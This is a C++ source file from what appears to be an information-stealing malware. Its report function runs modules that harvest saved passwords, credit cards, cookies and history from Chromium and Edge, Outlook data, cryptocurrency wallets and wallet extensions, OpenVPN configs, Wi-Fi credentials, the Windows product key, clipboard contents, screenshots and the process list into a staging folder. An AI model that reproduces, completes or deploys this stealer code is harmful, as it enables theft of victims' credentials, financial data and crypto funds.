#include "Report.h"
#include "Config.h"
#include "FileGrabber.h"
#include "Chromium.h"
#include "Edg.h"
#include "Outlook.h"
#include "Counter.h"
#include "Wallets.h"
#include "EdgExtensions.h"
#include "ChromExtensions.h"
#include "OpenVpn.h"
#include "DirectoryTree.h"
#include "ActiveWindows.h"
#include "DesktopScreenshot.h"
#include "SystemInfo.h"
#include "ProcessList.h"
#include "Wifi.h"
#include "ProductKey.h"
#include "Info.h"
#include "Clipboard.h"
#include "InstalledApps.h"
#include "Passwords.h"
#include "Paths.h"
#include <sys/stat.h>
#include <thread>
#include <vector>
#include <future>
#include <Shlwapi.h>

#pragma comment(lib, "Shell32.lib")

// Prevents warnings related to using experimental filesystem features
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING

// Includes the experimental filesystem library
#include <experimental/filesystem>

// Alias to make the code more readable: 'fs' represents the filesystem namespace
namespace fs = std::experimental::filesystem;

// Function to create a directory at the specified path
bool Report::createDirectory(std::string directoryPath)
{
    try
    {
        // Attempt to create the directory at the provided path
        fs::create_directory(directoryPath);
        return true;  // Return true if the directory is created successfully
    }
    catch (const std::exception& e)
    {
        // Catch any exceptions thrown during directory creation (e.g., invalid path)
        // No action is taken here, so the function will return false in case of failure
    }
    return false;  // Return false if directory creation fails or an exception occurs
}

// Function to write clipboard text to a file at the specified path
void Report::WriteAllText(std::string Path)
{
    // Retrieve the text from the clipboard (this function is assumed to be defined elsewhere)
    std::string text = Clipboard::GetText();

    // Append the filename to the given path to create the full file path
    Path += "\\Clipboard_Info.txt";

    // Open the file at the specified path in append mode
    std::ofstream ofs(Path, std::ios::app);

    // Check if the file was successfully opened
    if (ofs.is_open())
    {
        // Write the clipboard text to the file
        ofs << text << std::endl;

        // The file is automatically closed when 'ofs' goes out of scope
    }
}

// Function to create a comprehensive report at the specified save path
bool Report::CreateReport(std::string sSavePath)
{
    try
    {
        // Run the FileGrabber module in a separate thread, saving to the "Grabber" folder
        std::thread FileGrabberRun(FileGrabber::Run, sSavePath + "\\Grabber");
        FileGrabberRun.join();  // Wait for the FileGrabber thread to finish

        // Step 2: Chromium & Edge browser data (credit cards, passwords, cookies, autofill, history, bookmarks)
        // Run the Chromium data collection in a separate thread, saving to the "Browsers" folder
        std::thread Chromium(Chromium::Run, sSavePath + "\\Browsers");
        Chromium.join();  // Wait for the Chromium thread to finish

        // Similarly for Edge browser
        std::thread Edg(Edg::Run, sSavePath + "\\Browsers");
        Edg.join();  // Wait for the Edge thread to finish

        std::thread OutlookGrabOutlook(Outlook::GrabOutlook, sSavePath + "\\Messenger\\Outlook");
        OutlookGrabOutlook.join();

        // Step 5: Wallets data collection
        std::thread WalletsgetWallets(Wallets::getWallets, sSavePath + "\\Wallets");
        WalletsgetWallets.join();

        // Collect wallets from browser extensions (Edge & Chrome)
        std::string walletSaveDir = sSavePath + "\\Wallets\\Edge_Wallet";  // Intermediate variable for Edge
        std::thread EdgExtensionsGetChromeWallets(EdgExtensions::GetChromeWallets, std::ref(walletSaveDir));
        EdgExtensionsGetChromeWallets.join();

        std::string chromeWalletSaveDir = sSavePath + "\\Wallets\\Chrome_Wallet";  // Intermediate variable for Chrome
        std::thread ChromExtensionsGetChromeWallets(ChromExtensions::GetChromeWallets, std::ref(chromeWalletSaveDir));
        ChromExtensionsGetChromeWallets.join();

        // Step 6: VPN and directories data collection
        std::thread OpenVpnSave(OpenVpn::Save, sSavePath + "\\VPN\\OpenVPN");
        OpenVpnSave.join();

        std::thread ReportcreateDirectory(Report::createDirectory, sSavePath + "\\Directories");
        ReportcreateDirectory.join();

        std::thread DirectoryTreeSaveDirectories(DirectoryTree::SaveDirectories, sSavePath + "\\Directories");
        DirectoryTreeSaveDirectories.join();

        // Step 7: System information collection
        // Create a directory to save system info
        createDirectory(sSavePath + "\\System");

        // Collect process and active window information
        std::thread ProcessListsaveProcessInfoToFile(ProcessList::saveProcessInfoToFile, sSavePath + "\\System");
        ProcessListsaveProcessInfoToFile.join();

        std::thread ActiveWindowsWriteWindows(ActiveWindows::WriteWindows, sSavePath + "\\System");
        ActiveWindowsWriteWindows.join();

        // Take desktop and webcam screenshots
        std::thread DesktopScreenshotMake(DesktopScreenshot::Make, sSavePath + "\\System");
        DesktopScreenshotMake.join();

        // Save Wi-Fi network details and product key
        std::thread WifiSavedNetworks(Wifi::SavedNetworks, sSavePath + "\\System");
        WifiSavedNetworks.join();

        std::thread WifiScanningNetworks(Wifi::ScanningNetworks, sSavePath + "\\System");
        WifiScanningNetworks.join();

        std::thread WifiWriteProductKey(Wifi::WriteProductKey, sSavePath + "\\System");
        WifiWriteProductKey.join();

        // Step 8: Logging and additional system info collection
        //std::string systemSaveDir = sSavePath + "\\System";  // Intermediate variable for system directory
        //std::thread LoggingSave(Logging::Save, std::ref(systemSaveDir));
       // LoggingSave.join();

        std::thread InfoSave(Info::Save, sSavePath + "\\System");
        InfoSave.join();

        // Write clipboard text to the system folder
        std::thread ReportWriteAllText(Report::WriteAllText, sSavePath + "\\System");
        ReportWriteAllText.join();

        // Collect list of installed applications
        std::thread InstalledAppsWriteAppsList(InstalledApps::WriteAppsList, sSavePath + "\\System");
        InstalledAppsWriteAppsList.join();

        // Final step: Log the successful creation of the report
        return ""; // Logging::Log("Report created");
    }
    catch (const std::exception&)
    {
        // If an exception occurs during any step, log the error and return failure
        return ""; // Logging::Log("Failed to create report, error");
    }
}
